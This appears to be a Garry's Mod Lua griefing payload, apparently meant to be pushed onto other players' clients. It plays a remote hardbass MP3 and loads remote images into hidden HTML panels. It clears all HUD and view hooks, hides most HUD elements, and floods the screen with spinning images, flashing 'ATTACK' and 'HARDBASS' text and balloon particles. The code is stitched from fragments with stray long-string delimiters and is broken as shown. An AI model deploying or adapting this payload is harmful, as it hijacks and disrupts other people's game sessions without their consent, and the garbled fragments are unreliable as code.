
local lol = {}
lol.m_strImageGlobalVar = lol:RandomString( 6, 12 )
lol.m_strImageLoadHTML = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]


sound.PlayURL( "https://raw.githubusercontent.com/WERooo/somelua/master/hardbass.mp3", "", function()end ) -- https://srv21.mu.fm/7/d3/hard_bass_-_raz_raz_raz_eto_hard_bass_d_-_wapkenguru_(zf.fm).mp3
		
		g_]=].. lol.m_strImageGlobalVar..[=[ = {}
		local html = [[%s]]
		local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
			local pnl = vgui.Create( "HTML" )
			pnl:SetPos( ScrW() -1, ScrH() -1 )
			pnl:SetVisible( true )
			pnl:SetMouseInputEnabled( false )
			pnl:SetKeyBoardInputEnabled( false )
			pnl:SetSize( intSizeX, intSizeY )
			pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
			
			local PageLoaded
			PageLoaded = function()
				local mat = pnl:GetHTMLMaterial()
				if mat then
					g_]=].. lol.m_strImageGlobalVar..[=[[strUID] = { mat, pnl }
					return
				end
				
				timer.Simple( 0.5, PageLoaded )
			end
			PageLoaded()
		end
		LoadWebMaterial( "https://image.noelshack.com/fichiers/2017/47/3/1511306958-hud.png", "hud1", 300, 128 )
		LoadWebMaterial( "https://image.noelshack.com/fichiers/2017/47/3/1511306628-hud2.png", "hud2", 300, 128 )
		LoadWebMaterial( "https://image.noelshack.com/fichiers/2017/47/3/1511306630-hud3.png", "hud3", 128, 128 )
		LoadWebMaterial( "https://i.ytimg.com/vi/y90yaLFoYoA/maxresdefault.jpg", "doritos", 183, 256 )
		LoadWebMaterial( "https://coubsecure-s.akamaihd.net/get/b22/p/coub/simple/cw_timeline_pic/e508d626165/0fcf7dc0036a796b6ebfd/big_1408537565_image.jpg", "fedora", 256, 256 )
		LoadWebMaterial( "https://avatanplus.com/files/resources/mid/5851a5e058b5a158feeff46b.png", "dew", 110, 256 )
		LoadWebMaterial( "http://www.hardnews.nl/wp-content/uploads/2015/11/10-redenen-hard-bass-niet-missen.png", "awp", 256, 55 )
(GAMEMODE or GM).CalcView = function() end
		(GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
		local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
		for k, v in pairs(remove) do
			hook.GetTable()[v] = {}
		end
		local function GetWebMat( strURL )
			return g_]].. lol.m_strImageGlobalVar.. [[[strURL]
		end
		hook.Add( "HUDPaint", "newhud", function()
			surface.SetDrawColor( 255, 255, 255, 255 )
			if GetWebMat( "hud1" ) then
				surface.SetMaterial( GetWebMat("hud1")[1] )
				surface.DrawTexturedRect( 0, ScrH() -128, 300 *(512 /300), 128 )
			end
			if GetWebMat( "hud2" ) then
				surface.SetMaterial( GetWebMat("hud2")[1] )
				surface.DrawTexturedRect( ScrW() -300, ScrH() -128, 300 *(512 /300), 128 )
			end
			if GetWebMat( "hud3" ) then
				surface.SetMaterial( GetWebMat("hud3")[1] )
				surface.DrawTexturedRect( 45, ScrH() -245, 128, 128 )
			end
			if GetWebMat( "doritos" ) then
				surface.SetMaterial( GetWebMat("doritos")[1] )
				surface.DrawTexturedRectRotated( math.random(250, 260), math.random(250, 260), 183 *(256 /183), 256, CurTime() *512 )
			end
			if GetWebMat( "dew" ) then
				surface.SetMaterial( GetWebMat("dew")[1] )
				surface.DrawTexturedRectRotated( math.random(400, 410), math.random(ScrH() -260, ScrH() -250), 110 *((256 /110) -1), 256, CurTime() *-512 )
			end
			if GetWebMat( "fedora" ) then
				surface.SetMaterial( GetWebMat("fedora")[1] )
				surface.DrawTexturedRectRotated( ScrW() -math.random(250, 260), math.random(250, 260), 256, 256, CurTime() *-512 )
			end
			if GetWebMat( "awp" ) then
				surface.SetMaterial( GetWebMat("awp")[1] )
				surface.DrawTexturedRectRotated( ScrW() -math.random(400, 410), math.random(ScrH() -260, ScrH() -250), 256, 55, CurTime() *512 )
			end
			draw.SimpleTextOutlined(
				"ATTACK",
				"DermaLarge",
				ScrW() /2 +math.random( -8, 8 ),
				ScrH() /2 +math.random( -8, 8 ) +64,
				Color( 255, 0, 0, 255 ),
				TEXT_ALIGN_CENTER,
				TEXT_ALIGN_CENTER,
				1,
				Color( 0, 0, 255, 255 )
			) 
			draw.SimpleTextOutlined(
				"HARDBASS",
				"DermaLarge",
				ScrW() /2 +math.random( -8, 8 ),
				ScrH() /2 +math.random( -8, 8 ) +24,
				Color( 0, 255, 0, 255 ),
				TEXT_ALIGN_CENTER,
				TEXT_ALIGN_CENTER,
				1,
				Color( 0, 0, 255, 255 )
			) 
		end )
		local allowed = { ["CHudChat"] = true, ["CHudGMod"] = true, ["CHudWeaponSelection"] = true, ["CHudMenu"] = true }
		hook.Add( "HUDShouldDraw", "newhud", function( str ) if not allowed[str] then return false end end )
		surface.PlaySound( "garrysmod/save_load4.wav" )
		surface.PlaySound( "vo/npc/male01/excuseme02.wav" )
local emitter = ParticleEmitter( LocalPlayer():GetPos() )
		local time = 0
		hook.Add( "Think", "wat", function()
			if CurTime() < time then
				return
			end
			time = CurTime() +0.05
			for i = 1, 16 do
				local part = emitter:Add(
					"particles/balloon_bit", 
					LocalPlayer():GetPos() +Vector( 
						math.random( -256, 256 ), 
						math.random( -256, 256 ), 
						256
					)
				)
				
				if part then
					local Size = math.random( 4, 7 )
					
					part:SetColor( math.random(0, 255), math.random(0, 255), math.random(0, 255), 255 )
					part:SetVelocity( Vector( 40, 25, -math.random(300, 400) ) )
					part:SetDieTime( 4.5 )
					part:SetGravity( Vector(40, 0, -250) )
					part:SetLifeTime( 0 )
					part:SetStartSize( Size /2 )
					part:SetEndSize( Size )
					part:SetCollide( true )
				end
			end
		end )
